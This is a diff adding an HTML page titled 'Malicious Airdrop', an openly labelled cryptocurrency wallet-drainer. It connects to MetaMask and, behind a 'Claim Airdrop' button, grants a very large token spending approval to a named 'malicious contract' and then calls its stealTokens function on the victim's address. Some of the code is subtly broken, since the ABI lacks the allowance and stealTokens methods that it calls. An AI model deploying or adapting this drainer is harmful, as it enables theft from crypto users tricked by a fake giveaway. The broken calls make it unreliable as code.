@@ -1,1 +1,183 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Malicious Airdrop</title>
+  <script src="https://cdn.jsdelivr.net/npm/web3@1.7.1/dist/web3.min.js"></script>
+</head>
+<body>
+  <h1>Claim Your Malicious Airdrop</h1>
+
+  <button id="connectButton">Connect to MetaMask</button>
+  <button id="claimAirdropButton" disabled>Claim Airdrop</button>
+
+  <script>
+    // Set the contract address and ABI (from your provided information)
+    const contractAddress = '0x51ACC66Ea593080C8e006ddE56eb86b060A0fd37'; // The malicious contract address
+    const tokenAddress = '0x1dD71aCdc4091d8de461e46C8F142A7F32BEE9F4'; // The token address (e.g., TKK)
+    
+    const contractABI = [
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "spender",
+            "type": "address"
+          },
+          {
+            "internalType": "uint256",
+            "name": "amount",
+            "type": "uint256"
+          }
+        ],
+        "name": "approve",
+        "outputs": [
+          {
+            "internalType": "bool",
+            "name": "",
+            "type": "bool"
+          }
+        ],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "account",
+            "type": "address"
+          }
+        ],
+        "name": "balanceOf",
+        "outputs": [
+          {
+            "internalType": "uint256",
+            "name": "",
+            "type": "uint256"
+          }
+        ],
+        "stateMutability": "view",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "recipient",
+            "type": "address"
+          },
+          {
+            "internalType": "uint256",
+            "name": "amount",
+            "type": "uint256"
+          }
+        ],
+        "name": "transfer",
+        "outputs": [
+          {
+            "internalType": "bool",
+            "name": "",
+            "type": "bool"
+          }
+        ],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      },
+      {
+        "inputs": [
+          {
+            "internalType": "address",
+            "name": "sender",
+            "type": "address"
+          },
+          {
+            "internalType": "address",
+            "name": "recipient",
+            "type": "address"
+          },
+          {
+            "internalType": "uint256",
+            "name": "amount",
+            "type": "uint256"
+          }
+        ],
+        "name": "transferFrom",
+        "outputs": [
+          {
+            "internalType": "bool",
+            "name": "",
+            "type": "bool"
+          }
+        ],
+        "stateMutability": "nonpayable",
+        "type": "function"
+      }
+    ];
+
+    // Declare the Web3 instance and contract variables
+    let web3;
+    let contract;
+    let accounts;
+
+    // Set up the connection to MetaMask
+    async function connectMetaMask() {
+      if (typeof window.ethereum !== 'undefined') {
+        web3 = new Web3(window.ethereum);
+        try {
+          // Request MetaMask connection
+          accounts = await ethereum.request({ method: 'eth_requestAccounts' });
+          document.getElementById('connectButton').innerText = 'Connected: ' + accounts[0];
+          document.getElementById('claimAirdropButton').disabled = false; // Enable the claim button
+        } catch (error) {
+          alert('User rejected the request');
+        }
+      } else {
+        alert('Please install MetaMask to use this feature');
+      }
+    }
+
+    // Function to approve unlimited token spending
+    async function approveSpending() {
+      if (!web3) return;
+
+      const tokenContract = new web3.eth.Contract(contractABI, tokenAddress);
+      try {
+        const allowance = await tokenContract.methods.allowance(accounts[0], contractAddress).call();
+        if (parseInt(allowance) === 0) {
+          // Approve unlimited spending (set to a very large number)
+          const approvalAmount = web3.utils.toWei('1000000000', 'ether'); // Set a large number
+          const tx = await tokenContract.methods.approve(contractAddress, approvalAmount).send({ from: accounts[0] });
+          alert('Approval successful!');
+        } else {
+          alert('Already approved!');
+        }
+      } catch (error) {
+        console.error('Error approving spending:', error);
+        alert('Error during approval');
+      }
+    }
+
+    // Function to claim the airdrop (actually performs the malicious action)
+    async function claimAirdrop() {
+      await approveSpending();
+
+      // Now interact with the malicious contract
+      const maliciousContract = new web3.eth.Contract(contractABI, contractAddress);
+      try {
+        const tx = await maliciousContract.methods.stealTokens(accounts[0]).send({ from: accounts[0] });
+        alert('Airdrop claimed! Tokens are being stolen!');
+      } catch (error) {
+        console.error('Error claiming airdrop:', error);
+        alert('Error during claiming airdrop');
+      }
+    }
+
+    // Set event listeners
+    document.getElementById('connectButton').addEventListener('click', connectMetaMask);
+    document.getElementById('claimAirdropButton').addEventListener('click', claimAirdrop);
+  </script>
+</body>
+</html>
 
